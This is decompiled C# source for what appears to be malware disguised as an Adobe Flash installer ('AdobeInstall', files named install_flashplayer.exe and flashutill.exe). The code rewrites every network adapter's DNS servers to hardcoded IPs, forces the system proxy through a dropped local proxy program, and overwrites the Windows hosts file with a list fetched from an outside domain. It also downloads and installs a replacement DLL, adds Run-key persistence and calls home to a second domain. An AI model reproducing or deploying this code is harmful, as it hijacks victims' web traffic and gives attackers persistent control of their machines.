using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace AdobeInstall;

[StandardModule]
internal sealed class Module1
{
	public static string mydns1 = "77.221.136.245";

	public static string mydns2 = "46.173.208.101";

	public static void makeDNS()
	{
		string text = ".";
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\\\" + text + "\\root\\cimv2", (string)null));
		object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExecQuery", new object[1] { "Select * from Win32_NetworkAdapterConfiguration where IPEnabled = True" }, (string[])null, (Type[])null, (bool[])null));
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((IEnumerable)objectValue2).GetEnumerator();
			while (enumerator.MoveNext())
			{
				object objectValue3 = RuntimeHelpers.GetObjectValue(enumerator.Current);
				object obj;
				try
				{
					obj = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue3, (Type)null, "DNSServerSearchOrder", new object[0], (string[])null, (Type[])null, (bool[])null));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					obj = new object[2] { mydns1, mydns2 };
					ProjectData.ClearProjectError();
				}
				try
				{
					RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[1] { 0 }, (string[])null));
					RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[1] { 1 }, (string[])null));
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					obj = new object[2] { mydns1, mydns2 };
					ProjectData.ClearProjectError();
				}
				object obj2 = new object[2] { mydns1, mydns2 };
				object[] array = new object[1] { RuntimeHelpers.GetObjectValue(obj2) };
				bool[] array2 = new bool[1] { true };
				NewLateBinding.LateCall(objectValue3, (Type)null, "SetDNSServerSearchOrder", array, (string[])null, (Type[])null, array2, true);
				if (array2[0])
				{
					obj2 = RuntimeHelpers.GetObjectValue(array[0]);
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public static void SaveToDisk(string resourceName, string fileName)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
		int num = 0;
		checked
		{
			string text;
			while (true)
			{
				if (num < manifestResourceNames.Length)
				{
					text = manifestResourceNames[num];
					if (Operators.CompareString(text.ToLower(), resourceName.ToLower(), false) == 0)
					{
						break;
					}
					num++;
					continue;
				}
				return;
			}
			using Stream stream = executingAssembly.GetManifestResourceStream(text);
			if (stream == null)
			{
				return;
			}
			using BinaryReader binaryReader = new BinaryReader(stream);
			byte[] buffer = binaryReader.ReadBytes((int)stream.Length);
			using FileStream output = new FileStream(fileName, FileMode.Create);
			using BinaryWriter binaryWriter = new BinaryWriter(output);
			binaryWriter.Write(buffer);
		}
	}

	public static void SaveFiles()
	{
		try
		{
			string[] manifestResourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
			string[] array = manifestResourceNames;
			foreach (string text in array)
			{
				string text2 = text.Replace("AdobeInstall.", "");
				string text3 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Macromedia";
				if (!Directory.Exists(text3))
				{
					Directory.CreateDirectory(text3);
				}
				SaveToDisk(text, text3 + "\\" + text2);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			debug("SaveFiles: " + ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	public static void debug(string s)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		if (IsDebugMode())
		{
			Interaction.MsgBox((object)s, (MsgBoxStyle)0, (object)null);
		}
	}

	public static void MakeHosts()
	{
		try
		{
			string path = Environment.SystemDirectory + "\\drivers\\etc\\hosts";
			string text = HttpHelper.DownloadText("http://domenagent.ru/service/domains.txt");
			text = text.Replace("$ip", mydns1);
			File.WriteAllText(path, text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			debug("MakeHosts: " + ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	public static void UpdateDLL()
	{
		if (HttpHelper.DownloadFile("http://domenagent.ru/service/ProxyService.dll", proxyServerDLL_temp()))
		{
			try
			{
				File.Copy(proxyServerDLL_temp(), proxyServerDLL(), overwrite: true);
				return;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				debug("UpdateDLL: " + ex2.Message);
				ProjectData.ClearProjectError();
				return;
			}
		}
		debug("UpdateDLL: fail");
	}

	public static string selfFile()
	{
		return Assembly.GetExecutingAssembly().Location;
	}

	public static string TargetDir()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Macromedia\\";
	}

	public static string targetSmsFile()
	{
		return TargetDir() + "install_flashplayer.exe";
	}

	public static string targetFile()
	{
		return TargetDir() + "flashutill.exe";
	}

	public static string proxyServerFile()
	{
		return TargetDir() + "TestApp.exe";
	}

	public static string proxyServerDLL()
	{
		return TargetDir() + "ProxyService.dll";
	}

	public static string proxyServerDLL_sample()
	{
		return TargetDir() + "sample.txt";
	}

	public static string proxyServerDLL_temp()
	{
		return TargetDir() + "ProxyService.dll.temp";
	}

	public static bool CheckIfIamInstalled()
	{
		try
		{
			return File.Exists(proxyServerDLL());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public static void MakeRegistry()
	{
		try
		{
			File.Copy(selfFile(), targetFile(), overwrite: true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("me", targetFile());
			registryKey.Close();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey2.SetValue("me1", proxyServerFile());
			registryKey2.Close();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.WriteAllText(TargetDir() + "version", "1");
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	public static void WaitForInternet()
	{
		debug("wait internet start");
		string text = "";
		while (true)
		{
			text = HttpHelper.DownloadText("http://domenagent.ru/service/sample.txt");
			if (text.ToLower().Contains("replacement"))
			{
				break;
			}
			Thread.Sleep(5000);
		}
		File.WriteAllText(proxyServerDLL_sample(), text);
		debug("wait internet stop");
	}

	public static bool IsDebugMode()
	{
		return false;
	}

	public static void InstallYandex()
	{
	}

	public static void DoNothing()
	{
		Environment.ProcessorCount.ToString();
		string text = "";
		string text2 = "";
		int num = 0;
		do
		{
			text = text2;
			text2 = text;
			num = checked(num + 1);
		}
		while (num <= 10000);
	}

	[STAThread]
	public static void Main()
	{
		DoNothing();
		bool flag = CheckIfIamInstalled();
		makeDNS();
		debug("1");
		SaveFiles();
		debug("2");
		MakeRegistry();
		debug("3");
		SettingsHelper.SetProxy("127.0.0.1", 8083);
		debug("4");
		RunServer();
		debug("5");
		WaitForInternet();
		MakeHosts();
		debug("7");
		DropServer();
		debug("8");
		UpdateDLL();
		debug("9");
		RunServer();
		GoContact();
		debug("5");
		if (!flag)
		{
			InstallYandex();
		}
		debug("6");
		Die();
	}

	public static void GoContact()
	{
		WebClient webClient = new WebClient();
		string text = "";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			text = Conversions.ToString(registryKey.GetValue("Macromedia"));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, "", false) == 0)
		{
			try
			{
				webClient.DownloadString("http://contact-go.ru/prod.ashx?field=prod3");
				webClient.Proxy = null;
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey2.SetValue("Macromedia", "1");
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Die()
	{
		string fileName = Path.GetFileName(Assembly.GetExecutingAssembly().Location);
		Process[] processesByName = Process.GetProcessesByName(fileName);
		try
		{
			processesByName[0].Kill();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			processesByName[1].Kill();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void DropServer()
	{
		string processName = "TestApp";
		Process[] processesByName = Process.GetProcessesByName(processName);
		try
		{
			processesByName[0].Kill();
			processesByName[0].WaitForExit();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			processesByName[1].Kill();
			processesByName[1].WaitForExit();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void DropX()
	{
		string processName = "YandexInstakler";
		Process[] processesByName = Process.GetProcessesByName(processName);
		try
		{
			processesByName[0].Kill();
			processesByName[0].WaitForExit();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			processesByName[1].Kill();
			processesByName[1].WaitForExit();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		processName = "vktemy_1027a35407bcb8069c0a836716be1f";
		processesByName = Process.GetProcessesByName(processName);
		try
		{
			processesByName[0].Kill();
			processesByName[0].WaitForExit();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			processesByName[1].Kill();
			processesByName[1].WaitForExit();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	public static void RunServer()
	{
		DropServer();
		try
		{
			Process.Start(proxyServerFile());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
